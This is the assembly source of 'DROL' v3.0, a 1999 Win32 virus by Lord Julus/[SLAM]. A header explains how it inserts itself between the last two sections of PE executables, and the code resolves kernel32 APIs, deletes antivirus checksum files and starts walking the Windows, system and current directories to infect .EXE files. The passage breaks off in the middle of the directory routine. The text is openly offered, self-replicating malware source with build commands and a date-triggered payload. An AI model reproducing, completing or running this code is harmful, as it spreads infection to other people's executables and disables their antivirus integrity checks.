comment $

 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                Û ÛİŞŞÜ    Û ÛİŞŞÜ      ÛİŞŞÜ    Û Ûİ
                Û Û    ÛŞ  Û Û    ÛŞ  Û Û    ÛŞ  Û Û
                Û Û    ÛŞ  Û Û    ÛŞ  Û Û    ÛŞ  Û Û
                Û Û    ÛŞ  Û ÛİŞŞß    Û Û    ÛŞ  Û Û
                Û Û    ÛŞ  Û Û   ßÛŞ  Û Û    ÛŞ  Û Û
                Û Û    ÛŞ  Û Û    ÛŞ  Û Û    ÛŞ  Û Û
                Û Û    ÛŞ  Û Û    ÛŞ  Û Û    ÛŞ  Û Û
                Û ÛİŞŞß    Û Û    ÛŞ    ÛİŞŞß    Û ÛİŞŞÜ ÛŞ

                                    V.3.0

                                by Lord Julus

 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

        Well,  here  is my second Win32 virus. What this baby has and worths
 mentioning is this:

        The appending method is a kind of insertion I myself called section
 replicate.  That's so because the virus locates the last section in the PE
 file  and  makes a copy of the section header. Then allocates some memory,
 moves  the  last  section body there and copies itself over it. After that
 the  last  section  is  appended  after  the  virus  body. Each section is
 properly  aligned  and  also the filesize. After that the section that now
 points  to  the  virus  (the  before  last)  gets it's header arranged and
 receives  a  random name. The original last section which actually remains
 unmodified   gets   also   it's   header  rearranged.  All  the  necessary
 arrangements  are  made into the PE header. Unfortunately I seem to have a
 little    mistake   somewhere  that slips me. For some files that have the
 resource section last the internal icon of the file is no longer displayed
 properly  by  Windows.  Instead  the default icon is shown. This is really
 nasty  especially  as it occurs on files like excel.exe and winword.exe. I
 will have to dig furthure to find out what more arrangements should I make
 in order to fix the icon displaying for files with .rsrc section last.

        Well,  after  an e-mail exchange with JackyQwerty he pointed out to
 me  what  was  more  than  obvious... Once I move one section downward the
 file,  all  the  pointers in that section get lost... This means that when
 moving  the  section  all the RVAs inside that section must be rearranged.
 So, I set up the following scheme that this virus uses:

 ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³ START CHECKING ³
 ÀÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ³
 ÚÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿      ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿   ÚÄÄÄÄÄÄÄ¿
 ³ Are there any  ³ Yes  ³ Is there a  ³No ³Is the resource  ³No ³CANNOT ³
 ³ relocations in ÃÄÄÄÄÄÄ> relocations ÃÄÄÄ>section the last ÃÄÄÄ>INFECT ³
 ³ the file?      ³      ³ section?    ³   ³one?             ³   ³       ³
 ÀÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ      ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ   ÀÄÄÄÄÄÄÄÙ
   ³No                      ³Yes              ³Yes
 ÚÄvÄÄÄÄÄÄÄÄÄÄ¿      Yes ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄ¿  ÚÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
 ³Insert with <ÄÄÄÄÄÄÄÄÄÄ´Is it the last³  ³ Insert and rearrange the   ³
 ³no problems ³          ³section?      ³  ³ resource section 'by hand' ³
 ÀÄÂÄÄÄÄÄÄÄÄÄÄÙ          ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÙ  ÀÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
   ³    (1)                 ³No               ³  (3)
   ³                    ÚÄÄÄvÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿  ³
   ³                    ³ Insert and update³  ³
   ³                (2) ³ all the relocs in³  ³
   ³                    ³ the last section ³  ³
   ³                    ÀÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ  ³
   ³                        ³                 ³
   ³                        v                 v   ÚÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
   ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄ> DONE INFECT ³
                                                  ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÙ

        This  was  the  full nice and clean idea. The fact is that I wasn't
 able  to find any file that has relocations but the relocations section is
 not the last one, therefore the above algorithm got simplified to only the
 two  branches  (1)  and (3). If, however, the branch (2) is met, the virus
 will  abort  infection. As I said, I was not able to find any file to meet
 that criteria...

        Check  out  the  relocating inside the resource section... It was a
 bitch.

        One  very  important  thing  which  I  sort  of ignored in my other
 viruses  is the complete preservation of the registers on entry. Check out
 XZINE#3  for  a detailed explanation of the registers on entry. The use of
 these  registers  is undocumented so it shouldn't be used, but most of the
 Microsoft  applications  surely  use  them. That's why in this virus I was
 able to preserve all the registers as if the file was uninfected.

        Also,  a  major bug fix. This time the SEH frame works perfectly (I
 debugged  it  a thousand times), and now any error is cought and the virus
 returns to the host.

        A  fix  was made also into my random routine. Trigger pointed to me
 that  under NT all port I/O generate an exception error. That's why I used
 another random routine out of the thousand code snippets I have and I pass
 to it as a seed the number that is on the stack at entry. Works on, so the
 virus should be win95/98/NT compliant.

        This virus uses most of the stuff from my Undertaker virus like the
 API  importer and the directory scanner. There was no need to rewrite them
 as they work ok.

        I didn't add encryption and polymorphism (even if my poly engine is
 ready)  because  I  feel like this virus has enough new in it for now. The
 next version probably will include the last release of MOF32.

 Version  2.0  release:  I  cannot  believe  I  forgot  to  restore the ebx
 register  and eax is restored to the virus EIP, instead of the normal EIP.
 Stupido!!  Also, the flags are saved now... Still couldn't solve the icons
 problem and still winword doesn't work...

 Version  3.0  release:  Now  both  excel  and winword are working properly
 infected,  as  well  as any file with the relocations or resources section
 last. I think this is the last version of this virus. I doubt it will ever
 spread due to its way of appending. It was meant as a test.

        So, up to now:
        ==============

        Virus name        -  DROL
        Virus version     -  3.0
        Virus author      -  Lord Julus / [SLAM]
        Release date      -  20/03/1999
        Infection method  -  Insertion between the last two sections
        Properties        -  Preserves file time and attributes
        Encrypted         -  No
        Polymorphic       -  No
        Payload           -  On every 7th of the month a message box is
                             displayed and the cursor gets changed into a
                             skull (must reset to see it)
        Bugs              -  there is one but it doesn't affect in any way
                             the functionality of the virus or of the host,
                             therefore I will not tell what is it ;-)))

        History:
                 V3.0 (23/03/1999)
                 V2.0 (21/03/1999)
                 V1.0 (20/03/1999)

        Thanx go to: the SLAM group
                     JQwerty
                     Murkry
                     Z0mbie
                     and all the scene!!

        NB: I have no idea what DROL means. It just came to me and I didn't
 think  to  spell  Lord  the other way around ;-) Trigger told me that Drol
 means  something  like  'turd'  in  dutch, and some french dude told me it
 means  happy  but  it's  misspelled  (drole  is  correct).  As far as I am
 concerned I just felt like naming it somehow... Deal with it!! ;-))))))

 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
        For any suggestions or ideas please contact me here:

        e-mail: lordjulus@geocities.com

        http  : http://members.tripod.com/~lordjulus
                http://members.xoom.com/Julus [Mirror]
 ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ

                                     ÚÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
                                     ³  Lord Julus - 1999  ³
                                     ÀÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ


 Compile with:
                Tasm -ml -m drol.asm
                Tlink -Tpe -aa -c drol,,,import32.lib
                Pwresec drol.exe

        $

.386p
.model flat, stdcall
jumps


.data
db 0

.code

start:
       jmp realstart

; -- Equates -- ;

TRUE            EQU             1               ;
FALSE           EQU             0               ;
DEBUG           EQU             FALSE           ;
SEH             EQU             TRUE            ;
PAYLOAD         EQU             TRUE            ;
INFECT          EQU             TRUE            ;
                                                ;
IF              DEBUG                           ;
                                                ;
                exe_name        db  "*.XEX",0   ;
                killav          equ TRUE        ;
                payload         equ TRUE        ;
                                                ;
ELSE                                            ;
                                                ;
                exe_name        db "*.EXE",0    ;
                killav          equ TRUE        ;
                payload         equ TRUE        ;
                                                ;
ENDIF                                           ;
                                                ;
virussize       EQU             end-start       ;
                                                ;
; -- Externals -- ;                             ;
                                                ;
extrn ExitProcess: PROC                         ;
extrn GetProcAddress: PROC                      ;
extrn MessageBoxA: PROC                         ;
                                                ;
; -- Structures -- ;                            ;

IMAGE_DOS_HEADER STRUC            ; DOS .EXE header
    MZ_magic      DW ?            ; Magic number
    MZ_cblp       DW ?            ; Bytes on last page of file
    MZ_cp         DW ?            ; Pages in file
    MZ_crlc       DW ?            ; Relocations
    MZ_cparhdr    DW ?            ; Size of header in paragraphs
    MZ_minalloc   DW ?            ; Minimum extra paragraphs needed
    MZ_maxalloc   DW ?            ; Maximum extra paragraphs needed
    MZ_ss         DW ?            ; Initial (relative) SS value
    MZ_sp         DW ?            ; Initial SP value
    MZ_csum       DW ?            ; Checksum
    MZ_ip         DW ?            ; Initial IP value
    MZ_cs         DW ?            ; Initial (relative) CS value
    MZ_lfarlc     DW ?            ; File address of relocation table
    MZ_ovno       DW ?            ; Overlay number
    MZ_res        DW 4 DUP(?)     ; Reserved words
    MZ_oemid      DW ?            ; OEM identifier (for MZ_oeminfo)
    MZ_oeminfo    DW ?            ; OEM information; MZ_oemid specific
    MZ_res2       DW 10 DUP(?)    ; Reserved words
    MZ_lfanew     DD ?            ; File address of new exe header
IMAGE_DOS_HEADER ENDS             ;
IMAGE_DOS_HEADER_SIZE = SIZE IMAGE_DOS_HEADER
                                  ;
IMAGE_FILE_HEADER STRUC           ; Portable Exe File
    PE_Magic                 DD ? ;
    Machine                  DW ? ; Machine type
    NumberOfSections         DW ? ; Number of sections
    TimeDateStamp            DD ? ; Date and Time
    PointerToSymbolTable     DD ? ; Pointer to Symbols
    NumberOfSymbols          DD ? ; Number of Symbols
    SizeOfOptionalHeader     DW ? ; Size of Optional Header
    Characteristics          DW ? ; File characteristics
IMAGE_FILE_HEADER ENDS            ;
IMAGE_FILE_HEADER_SIZE = SIZE IMAGE_FILE_HEADER

IMAGE_DATA_DIRECTORY STRUC                         ; Image data directory
    DD_VirtualAddress DD ?                         ; Virtual address
    DD_Size           DD ?                         ; Virtual size
IMAGE_DATA_DIRECTORY ENDS                          ;
                                                   ;
IMAGE_DIRECTORY_ENTRIES STRUC                      ; All directories
    DE_Export           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Import           IMAGE_DATA_DIRECTORY    ?  ;
    DE_Resource         IMAGE_DATA_DIRECTORY    ?  ;
    DE_Exception        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Security         IMAGE_DATA_DIRECTORY    ?  ;
    DE_BaseReloc        IMAGE_DATA_DIRECTORY    ?  ;
    DE_Debug            IMAGE_DATA_DIRECTORY    ?  ;
    DE_Copyright        IMAGE_DATA_DIRECTORY    ?  ;
    DE_GlobalPtr        IMAGE_DATA_DIRECTORY    ?  ;
    DE_TLS              IMAGE_DATA_DIRECTORY    ?  ;
    DE_LoadConfig       IMAGE_DATA_DIRECTORY    ?  ;
    DE_BoundImport      IMAGE_DATA_DIRECTORY    ?  ;
    DE_IAT              IMAGE_DATA_DIRECTORY    ?  ;
IMAGE_DIRECTORY_ENTRIES ENDS                       ;
IMAGE_NUMBEROF_DIRECTORY_ENTRIES = 16              ;
                                                   ;
IMAGE_OPTIONAL_HEADER STRUC                        ; Optional Header
    OH_Magic                        DW ?           ; Magic word
    OH_MajorLinkerVersion           DB ?           ; Major Linker version
    OH_MinorLinkerVersion           DB ?           ; Minor Linker version
    OH_SizeOfCode                   DD ?           ; Size of code section
    OH_SizeOfInitializedData        DD ?           ; Initialized Data
    OH_SizeOfUninitializedData      DD ?           ; Uninitialized Data
    OH_AddressOfEntryPoint          DD BYTE PTR ?  ; Initial EIP
    OH_BaseOfCode                   DD BYTE PTR ?  ; Code Virtual Address
    OH_BaseOfData                   DD BYTE PTR ?  ; Data Virtual Address
    OH_ImageBase                    DD BYTE PTR ?  ; Base of image
    OH_SectionAlignment             DD ?           ; Section Alignment
    OH_FileAlignment                DD ?           ; File Alignment
    OH_MajorOperatingSystemVersion  DW ?           ; Major OS
    OH_MinorOperatingSystemVersion  DW ?           ; Minor OS
    OH_MajorImageVersion            DW ?           ; Major Image version
    OH_MinorImageVersion            DW ?           ; Minor Image version
    OH_MajorSubsystemVersion        DW ?           ; Major Subsys version
    OH_MinorSubsystemVersion        DW ?           ; Minor Subsys version
    OH_Win32VersionValue            DD ?           ; win32 version
    OH_SizeOfImage                  DD ?           ; Size of image
    OH_SizeOfHeaders                DD ?           ; Size of Header
    OH_CheckSum                     DD ?           ; unused
    OH_Subsystem                    DW ?           ; Subsystem
    OH_DllCharacteristics           DW ?           ; DLL characteristic
    OH_SizeOfStackReserve           DD ?           ; Stack reserve
    OH_SizeOfStackCommit            DD ?           ; Stack commit
    OH_SizeOfHeapReserve            DD ?           ; Heap reserve
    OH_SizeOfHeapCommit             DD ?           ; Heap commit
    OH_LoaderFlags                  DD ?           ; Loader flags
    OH_NumberOfRvaAndSizes          DD ?           ; Number of directories
                                    UNION          ; directory entries
    OH_DataDirectory                IMAGE_DATA_DIRECTORY\
                                    IMAGE_NUMBEROF_DIRECTORY_ENTRIES DUP (?)
    OH_DirectoryEntries             IMAGE_DIRECTORY_ENTRIES ?
                                    ENDS           ;
    ENDS                                           ;
IMAGE_OPTIONAL_HEADER_SIZE = SIZE IMAGE_OPTIONAL_HEADER
                                                   ;
IMAGE_SECTION_HEADER STRUC                         ; Section hdr.
    SH_Name                 DB 8 DUP(?)            ; name
                            UNION                  ;
    SH_PhysicalAddress      DD BYTE PTR ?          ; Physical address
    SH_VirtualSize          DD ?                   ; Virtual size
                            ENDS                   ;
    SH_VirtualAddress       DD BYTE PTR ?          ; Virtual address
    SH_SizeOfRawData        DD ?                   ; Raw data size
    SH_PointerToRawData     DD BYTE PTR ?          ; pointer to raw data
    SH_PointerToRelocations DD BYTE PTR ?          ; ...
    SH_PointerToLinenumbers DD BYTE PTR ?          ; ...... not really used
    SH_NumberOfRelocations  DW ?                   ; ....
    SH_NumberOfLinenumbers  DW ?                   ; ..
    SH_Characteristics      DD ?                   ; flags
IMAGE_SECTION_HEADER ENDS                          ;
IMAGE_SECTION_HEADER_SIZE = SIZE IMAGE_SECTION_HEADER

IMAGE_RESOURCE_DIRECTORY STRUC            ;
    RD_Characteristics      DD ?          ;
    RD_TimeDateStamp        DD ?          ;
    RD_MajorVersion         DW ?          ;
    RD_MinorVersion         DW ?          ;
    RD_NumberOfNamedEntries DW ?          ;
    RD_NumberOfIdEntries    DW ?          ;
IMAGE_RESOURCE_DIRECTORY ENDS             ;
IMAGE_RESOURCE_DIRECTORY_SIZE = SIZE IMAGE_RESOURCE_DIRECTORY

IMAGE_RESOURCE_DIRECTORY_ENTRY STRUC      ;
        UNION                             ;
        STRUC                             ;
        RDE_Offset RECORD  {              ;
        RDE_NameOffset:31                 ;
        RDE_NameIsString:1 }              ;
        ENDS                              ;
        RDE_Name DD ?                     ;
        RDE_Id   DW ?                     ;
        ENDS                              ;
        UNION                             ;
        RDE_OffsetToData DD ?             ;
        STRUC                             ;
        RDE_Directory RECORD     {        ;
        RDE_OffsetToDirectory:31          ;
        RDE_DataIsDirectory:1    }        ;
        ENDS                              ;
        ENDS                              ;
IMAGE_RESOURCE_DIRECTORY_ENTRY ENDS       ;

IMAGE_RESOURCE_DATA_ENTRY STRUC           ;
    REDE_OffsetToData DD ?                ;
    REDE_Size         DD ?                ;
    REDE_CodePage     DD ?                ;
    REDE_Reserved     DD ?                ;
IMAGE_RESOURCE_DATA_ENTRY ENDS            ;


filetime                        struc             ; filetime structure
        FT_dwLowDateTime        dd ?              ;
        FT_dwHighDateTime       dd ?              ;
filetime                        ends              ;
                                                  ;
win32_find_data                 struc             ;
        FileAttributes          dd ?              ; attributes
        CreationTime            filetime ?        ; time of creation
        LastAccessTime          filetime ?        ; last access time
        LastWriteTime           filetime ?        ; last modificationm
        FileSizeHigh            dd ?              ; filesize
        FileSizeLow             dd ?              ; -"-
        Reserved0               dd ?              ;
        Reserved1_              dd ?              ;
        FileName                db 260 dup (?)    ; long filename
        AlternateFileName       db 13 dup (?)     ; short filename
                                db 3 dup (?)      ; dword padding
win32_find_data                 ends              ;
                                                  ;
                                                  ;
; -- APIS --                                      ;
                                                  ;
First_API:                                        ; Here we have the names
AGetProcAddress      db "GetProcAddress",0        ; of the APIs this program
AExitProcess         db "ExitProcess",0           ; is about to use
AFindFirstFileA      db "FindFirstFileA",0        ;
AFindNextFileA       db "FindNextFileA",0         ;
AGetCurrentDirectory db "GetCurrentDirectoryA",0  ;
ACreateFileMapping   db "CreateFileMappingA",0    ;
AMapViewOfFile       db "MapViewOfFile",0         ;
AUnmapViewOfFile     db "UnmapViewOfFile",0       ;
AGetFileAttributes   db "GetFileAttributesA",0    ;
ASetFileAttributes   db "SetFileAttributesA",0    ;
AGetDriveType        db "GetDriveTypeA",0         ;
ACreateFile          db "CreateFileA",0           ;
ACloseHandle         db "CloseHandle",0           ;
AGetFileTime         db "GetFileTime",0           ;
ASetFileTime         db "SetFileTime",0           ;
ASetFilePointer      db "SetFilePointer",0        ;
AGetFileSize         db "GetFileSize",0           ;
ASetEndOfFile        db "SetEndOfFile",0          ;
AGetSystemTime       db "GetSystemTime",0         ;
AGetModuleHandle     db "GetModuleHandleA",0      ;
AGetWindowsDirectory db "GetWindowsDirectoryA",0  ;
AGetSystemDirectory  db "GetSystemDirectoryA",0   ;
ASetCurrentDirectory db "SetCurrentDirectoryA", 0 ;
ADeleteFile          db "DeleteFileA", 0          ;
AGlobalAlloc         db "GlobalAlloc", 0          ;
AWriteFile           db "WriteFile", 0            ;
                     db 0FFh                      ;
                                                  ;
API_A:                                            ; and here are the addresses
AGetProcAddressA      dd 0                        ; that we found
AExitProcessA         dd 0                        ;
AFindFirstFileAA      dd 0                        ;
AFindNextFileAA       dd 0                        ;
AGetCurrentDirectoryA dd 0                        ;
ACreateFileMappingA   dd 0                        ;
AMapViewOfFileA       dd 0                        ;
AUnmapViewOfFileA     dd 0                        ;
AGetFileAttributesA   dd 0                        ;
ASetFileAttributesA   dd 0                        ;
AGetDriveTypeA        dd 0                        ;
ACreateFileA          dd 0                        ;
ACloseHandleA         dd 0                        ;
AGetFileTimeA         dd 0                        ;
ASetFileTimeA         dd 0                        ;
ASetFilePointerA      dd 0                        ;
AGetFileSizeA         dd 0                        ;
ASetEndOfFileA        dd 0                        ;
AGetSystemTimeA       dd 0                        ;
AGetModuleHandleA     dd 0                        ;
AGetWindowsDirectoryA dd 0                        ;
AGetSystemDirectoryA  dd 0                        ;
ASetCurrentDirectoryA dd 0                        ;
ADeleteFileAA         dd 0                        ;
AGlobalAllocA         dd 0                        ;
AWriteFileA           dd 0                        ;
                                                  ;
aa32                  db "ADVAPI32.dll", 0        ; needed for the registry
aa321                 db "RegCreateKeyExA", 0     ; operations
aa322                 db "RegSetValueExA", 0      ;
                                                  ;
ARegCreateKeyExA      dd 0                        ;
ARegSetValueExA       dd 0                        ;
                                                  ;
AMessageBox           db "MessageBoxA", 0         ;
                                                  ;
; -- Data -- ;                                    ;

search    win32_find_data ?       ; our search area
gha       db "GetModuleHandleA",0 ; we search for this first to get the k32
gha_size  = $ - gha               ; size of string
kernel32  dd 00000000h            ; address of the kernel32 module
u32       db "USER32.dll"         ;
user32    dd 0                    ;
newimagebase label                ; here we put the real image base
imagebase dd  00400000h           ; the default assumed image base
                                  ;
entrypoint       dd 0             ; original program's entrypoint
export           dd 0             ;
basef            dd 0             ; base of functions
limit            dd 0             ; number of exported functions
AddFunc          dd 0             ; address of functions
AddName          dd 0             ; address of names
AddOrd           dd 0             ; address of ordinals
Nindex           dd 0             ; index of names
                                  ;
oldeip           dd 0             ;
crtdir           db 128h dup(0)   ; Current directory
windir           db 128h dup(0)   ; Windows directory
sysdir           db 128h dup(0)   ; System directory
infections       dd 3             ;
crt_dir_flag     db 0             ;

maphandle        dd 0             ; handle of the map for the file
filehandle       dd 0             ; handle of the file
memory           dd 0             ; memory needed
fileattributes   dd 0             ; file attributes
fileofs          dd 0             ; pointer to filename
ftcreation       dq 0             ; time values
ftlastwrite      dq 0             ;
ftlastaccess     dq 0             ;
newfilesize      dd 0             ; new size of file
mapaddress       dd 0             ; address of the map
infectionflag    dw 0             ;
PEheader         dd 0             ;
LastSection      dd 0             ;
filealign        dd 0             ;
sectionalign     dd 0             ;
newsizeofrawdata dd 0             ;
systemtime       dw 8 dup (0)     ; the time
secname          db '.drol',0,0,0,0 ; new section name
savedRVA         dd 0             ;
newRVA           dd 0             ;
LJFlag           dd 0             ;
relocations      dd 0             ;
resources        dd 0             ;
DeltaRVA         dd 0             ;

av1              db "AVP.CRC"     , 0  ; the av files to kill
av2              db "IVP.NTZ"     , 0  ;
av3              db "Anti-Vir.DAT", 0  ;
av4              db "CHKList.MS"  , 0  ;
av5              db "CHKList.CPS" , 0  ;
av6              db "SmartCHK.MS" , 0  ;
av7              db "SmartCHK.CPS", 0  ;
av_end           db 0FFh               ;
av_list          dd offset av1         ;
                 dd offset av2         ;
                 dd offset av3         ;
                 dd offset av4         ;
                 dd offset av5         ;
                 dd offset av6         ;
                 dd offset av7         ;
                 dd offset av_end      ;

; -- Code --                             ;
                                         ;
realstart:                               ;
       pushf                             ;
       pushad                            ; save ALL!!
       call getdelta                     ; get the delta handle
                                         ;
getdelta:                                ;
       pop ebp                           ;
       sub ebp, offset getdelta          ;
                                         ;
       mov dword ptr [ebp+delta], ebp    ; save our delta
       call randomize                    ; initialize the random nr. gen.
                                         ;
       lea eax, [ebp+ExceptionExit]      ; replace the original SEH
       push eax                          ; handler with our own
       push dword ptr fs:[0]             ;
       mov fs:[0], esp                   ;
                                         ;
       mov eax, dword ptr [esp+08h+24h]  ; how much to scan? +20h because
                                         ; I made a pushad
find_base_loop:                          ;
       cmp dword ptr [eax+0b4h], eax     ; if we're at base, then
       je found                          ; offset 0b4h contains kernel32
       dec eax                           ; base
       cmp eax, 40000000h                ; here is the kernel limit (cannot
       jbe assume_hardcoded              ; be below)
       jmp find_base_loop                ;
                                         ;
assume_hardcoded:                        ;
      mov eax, 0BFF70000h                ; if fail, assume hardcoded kernel
      cmp word ptr [eax], 'ZM'           ; really win95/98 k32?
      je found                           ;
      mov eax, 07FFF0000h                ; try the NT hardcoded kernel value
                                         ;
found:                                   ;
      mov [ebp+offset kernel32], eax     ; save the Kernel address
                                         ;
      mov edi, eax                       ; check if it's really the k32 there
      cmp word ptr [edi], 'ZM'           ; magic word...
      jne return_to_host                 ;
                                         ;
      mov edi, [edi+3ch]                 ; look for...
      add edi, [ebp+offset kernel32]     ;
      cmp word ptr [edi], 'EP'           ; ...Portable Exe signature
      jne return_to_host                 ;
                                         ;
      pushad                             ; save all regs !
      mov esi, [edi+78H]                 ; 78H = address for the export dir
      add esi, [ebp+offset kernel32]     ; normalize
      mov [ebp+offset export], esi       ; save it
      add esi, 10H                       ; look for base of functions
      lodsd                              ;
      mov [ebp+offset basef], eax        ; get base of the functions
      lodsd                              ; Number of Functions
      lodsd                              ; Number of Names
      mov [ebp+offset limit], eax        ; save the number of names
      add eax, [ebp+offset kernel32]     ;
      lodsd                              ; Address of Functions
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddFunc],eax       ;
      lodsd                              ;
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddName], eax      ; Address of Names
      lodsd                              ;
      add eax, [ebp+offset kernel32]     ;
      mov [ebp+offset AddOrd], eax       ; Address of Ordinals
      mov esi,[ebp+offset AddFunc]       ;
      lodsd                              ;
      add eax, [ebp+offset kernel32]     ;
                                         ;
      mov esi, [ebp+offset AddName]      ; get the first rva pointer to a name
      mov [ebp+offset Nindex], esi       ; index into the name array
      mov edi, [esi]                     ; now make it a true pointer to the
      add edi, [ebp+offset kernel32]     ; name by adding the offset
      mov ecx, 0                         ; sets the counter to 0
      mov ebx, offset First_API          ; Set starting address
      add ebx, ebp                       ;
                                         ;
tryagain:                                ;
      mov esi, ebx                       ; what function we are looking for
                                         ;
matchbyte:                               ;
      cmpsb                              ; do we have a byte match ?
      jne nextone                        ; no! Try next name of function
                                         ;
      cmp byte ptr [edi], 0              ; did the entire string match ?
      je gotit                           ; YES !
      jmp matchbyte                      ; nope... try next byte
                                         ;
nextone:                                 ;
      inc cx                             ; increment counter
      cmp cx, word ptr [ebp+offset limit]; check limit override
      jge return_to_host                 ;
                                         ;
      add dword ptr [ebp+offset Nindex], 4; get the next pointer rva
      mov esi, [ebp+offset Nindex]       ; and try again
      mov edi, [esi]                     ;
      add edi, [ebp+offset kernel32]     ;
      jmp tryagain                       ;
                                         ;
; Here we assume this:
;      cx = the index into the Address of Ordinals
;      take Name_index * 4 + [AddOrd] = Ordinal
;      Ordinal * 4 + [Address of Functions] should be the rva to the fuction

gotit:                                   ;
      mov ebx, esi                       ; get set for next search routine
      inc ebx                            ;
      shl ecx, 1                         ; *2 looking into a word array
      mov esi, [ebp+offset AddOrd]       ;
      add esi, ecx                       ;
      xor eax, eax                       ;
      mov ax, word ptr [esi]             ;
      shl eax, 2                         ; *4 looking into a dword array
      mov esi, [ebp+offset AddFunc]      ;
      add esi, eax                       ;
      mov edi, dword ptr [esi]           ;
      add edi, [ebp+offset kernel32]     ;
                                         ;
      mov [ebp+offset AGetProcAddressA], edi   ; our goal: GETPROCADDRESS !
                                         ;
      popad                              ; restore registers
                                         ;
      mov esi, offset AExitProcess       ; and start retrieving all the apis
      mov edi, offset AExitProcessA      ; we need !
      add esi, ebp                       ;
      add edi, ebp                       ;
                                         ;
Repeat_find_apis:                        ;
      push esi                           ; find an API
      mov eax, [ebp+offset kernel32]     ;
      push eax                           ;
      call dword ptr [ebp+offset AGetProcAddressA]
      cmp eax, 0                         ; check if an API find failed
      je return_to_host                  ;
      stosd                              ; store it's address
                                         ;
repeat_inc:                              ;
      inc esi                            ; go to the next API name
      cmp byte ptr [esi], 0              ;
      jne repeat_inc                     ;
      inc esi                            ;
      cmp byte ptr [esi], 0FFh           ; and check for the end
      jne Repeat_find_apis               ;
                                         ;
IF    payload                            ;
                                         ;
      cmp ebp, 0                         ; don't run payload if it is
      je np1                             ; generation 0...
      call Payload                       ;
      np1:                               ;
                                         ;
ENDIF                                    ;
                                         ;
      call Main_checks                   ;
      call Infect_directories            ; Infect the directories...
                                         ;
return_to_host:                          ;
       jmp restore_seh                   ;
                                         ;
ExceptionExit:                           ; if we had an error we must
       mov esp, [esp+8]                  ; restore the ESP
                                         ;
restore_seh:                             ;
       pop dword ptr fs:[0]              ; and restore the original SEH
       add esp, 4                        ; returning to the host...
                                         ;
       popad                             ; restore ALL registers!!!!
                                         ;
       push edi                          ; temporary save edi
       db 0bfh                           ; put delta in edi
delta  dd 0                              ;
                                         ;
       cmp edi, 0                        ; first generation ?
       je exit_now                       ;
       mov eax, [edi+offset oldeip]      ; restore old IP
       add eax, [edi+offset imagebase]   ; align to memory
       push eax                          ;
       push ebx                          ;
       lea ebx, [edi+offset jump]        ; calculate the length of the jump
       sub eax, ebx                      ; to the host
       sub eax, 4                        ;
       mov dword ptr [edi+jump], eax     ; and store the jump!
       pop ebx                           ;
       pop eax                           ;
       pop edi                           ;
       popf                              ;
                                         ;
       db 0e9h                           ; this is JMP Original EIP
jump   dd 0                              ;
                                         ;
exit_now:                                ;
       add esp, 4                        ; restore stack but not edi!!
       push 0                            ;
       call dword ptr [edi+offset AExitProcessA] ; we need edi here...
                                         ;
; -- Checks -- ;                         ;
                                         ;
Main_checks proc near                    ;
      push 0                             ;
      call dword ptr [ebp+offset AGetDriveTypeA] ; Get the drive type
      cmp eax, 3                         ; do we have a fixed disk ?
      jne not_crt_dir                    ;
      mov byte ptr [ebp+crt_dir_flag], 1 ; mark it so we know....
      jmp go_on_1                        ;
                                         ;
not_crt_dir:                             ;
      mov byte ptr [ebp+crt_dir_flag], 0 ;
                                         ;
go_on_1:                                 ;
      ret                                ;
Main_checks endp                         ;
                                         ;
; -- Infection Routines -- ;             ;
                                         ;
Infect_directories proc near             ;
      push  128                          ; Get Windows directory
      lea eax, [ebp+offset windir]       ;
      push eax                           ;
      call dword ptr [ebp+offset AGetWindowsDirectoryA]
                                         ;
      push  128                          ; Get System directory
      lea eax, [ebp+offset sysdir]       ;
      push eax                           ;
      call dword ptr [ebp+offset AGetSystemDirectoryA]
                                         ;
      lea eax, [ebp+offset crtdir]       ; Get Current directory
      push eax                           ;
      push 128                           ;
      call dword ptr [ebp+offset AGetCurrentDirectoryA]
